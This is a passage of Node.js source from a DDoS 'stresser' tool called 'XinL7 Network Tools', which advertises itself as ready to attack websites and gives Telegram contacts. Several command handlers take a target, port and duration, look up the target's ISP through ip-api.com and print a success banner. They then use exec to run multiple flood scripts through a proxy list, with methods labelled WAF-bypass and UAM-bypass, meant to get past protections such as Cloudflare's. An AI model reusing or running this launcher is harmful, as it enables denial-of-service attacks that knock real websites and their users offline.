┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mH2-SLASH\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const vip = path.join(__dirname, `/lib/cache/vip.js`);
const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
const inferno = path.join(__dirname, `/lib/cache/inferno.js`);
        exec(`node ${vip} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${thunder} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${inferno} ${target} ${duration} 80 10 proxy.txt`)   
sigma()
}; 
async function bom(args) {
  if (args.length < 3) {
    console.log(`Example: bom <Target> <Duration>
bom https://website.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mBOM\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const bom = path.join(__dirname, `/lib/cache/bom.js`);
const tyoflood = path.join(__dirname, `/lib/cache/tyoflood`);
const stormx = path.join(__dirname, `/lib/cache/stormx.js`);
        exec(`node ${bom} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${stormx} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tyoflood} ${target} ${duration} 80 10 proxy.txt`) 
sigma()
}; 
async function h2xvip(args) {
  if (args.length < 3) {
    console.log(`Example: uam-bypass <Target> <Duration>
uam-bypass https://website.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mH2X-VIP\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const uamx = path.join(__dirname, `/lib/cache/bom.js`);
const floodvip = path.join(__dirname, `/lib/cache/floodvip.js`);
        exec(`node ${uamx} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${floodvip} ${target} ${duration} 80 10 proxy.txt`)     
sigma()
}; 
async function wafbypass(args) {
  if (args.length < 3) {
    console.log(`Example: waf-uam <Target> <Duration>
uam-bypass https://website.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mWAF-BYPASS\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tls = path.join(__dirname, `/lib/cache/strike.js`);
const tlsx = path.join(__dirname, `/lib/cache/destroy.js`);
const moku = path.join(__dirname, `/lib/cache/https.js`);
        exec(`node ${tls} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${tlsx} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${moku} ${target} ${duration} 80 10 proxy.txt`)
sigma()
}; 
async function h2cfb(args) {
  if (args.length < 3) {
    console.log(`Example: h2-cfb <Target> <Duration>
h2-cfb https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
